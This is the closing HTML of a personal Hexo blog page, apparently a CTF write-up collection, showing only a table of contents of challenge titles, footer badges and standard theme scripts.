href="#%E9%81%97%E5%A4%B1%E7%9A%84%E6%8B%89%E9%93%BE"><span class="toc-text">遗失的拉链</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%A2%E8%B0%A2%E7%9A%AE%E8%9B%8Bplus"><span class="toc-text">谢谢皮蛋plus</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PangBai-%E8%BF%87%E5%AE%B6%E5%AE%B6%EF%BC%882%EF%BC%89"><span class="toc-text">PangBai 过家家（2）</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#re"><span class="toc-text">re</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#misc"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CTFshow-2"><span class="toc-text">CTFshow</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E7%AD%BE%E5%88%B0"><span class="toc-text">杂项签到</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BC%AA%E5%8A%A0%E5%AF%86"><span class="toc-text">伪加密</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc2"><span class="toc-text">misc2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#miscx"><span class="toc-text">miscx</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#misc50"><span class="toc-text">misc50</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Newstar-1"><span class="toc-text">Newstar</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#decompress"><span class="toc-text">decompress</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pleasingMusic"><span class="toc-text">pleasingMusic</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WhereIsFlag"><span class="toc-text">WhereIsFlag</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Labyrinth"><span class="toc-text">Labyrinth</span></a></li></ol></li></ol></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By Sarecter</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">I wish you to become your own sun, no need to rely on who's light.<p><a target="_blank" href="https://hexo.io/"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&logo=hexo" title="博客框架为Hexo"></a>&nbsp;<a target="_blank" href="https://butterfly.js.org/"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&logo=bitdefender" title="主题采用butterfly"></a>&nbsp;<a target="_blank" href="https://www.jsdelivr.com/"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&logo=jsDelivr" title="本站使用JsDelivr为静态资源提供CDN加速"></a> &nbsp;<a target="_blank" href="https://vercel.com/ "><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vervel-brightgreen?style=flat&logo=Vercel" title="本站采用双线部署，默认线路托管于Vercel"></a>&nbsp;<a target="_blank" href="https://vercel.com/ "><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Coding-0cedbe?style=flat&logo=Codio" title="本站采用双线部署，联通线路托管于Coding"></a>&nbsp;<a target="_blank" href="https://github.com/"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&logo=GitHub" title="本站项目由Gtihub托管"></a>&nbsp;<a target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/4.0/"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Copyright-BY--NC--SA%204.0-d42328?style=flat&logo=Claris" title="本站采用知识共享署名-非商业性使用-相同方式共享4.0国际许可协议进行许可"></a></p># 是一个给你用来在页脚自定义文本的选项。通常你可以在这里写声明文本等,支持 HTML。</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>(() => {
+  const panguFn = () => {
+    if (typeof pangu === 'object') pangu.autoSpacingPage()
+    else {
+      btf.getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+        .then(() => {
+          pangu.autoSpacingPage()
+        })
+    }
+  }
+
+  const panguInit = () => {
+    if (false){
+      GLOBAL_CONFIG_SITE.isPost && panguFn()
+    } else {
+      panguFn()
+    }
+  }
+
+  btf.addGlobalFn('pjaxComplete', panguInit, 'pangu')
+  document.addEventListener('DOMContentLoaded', panguInit)
+})()</script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="30" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
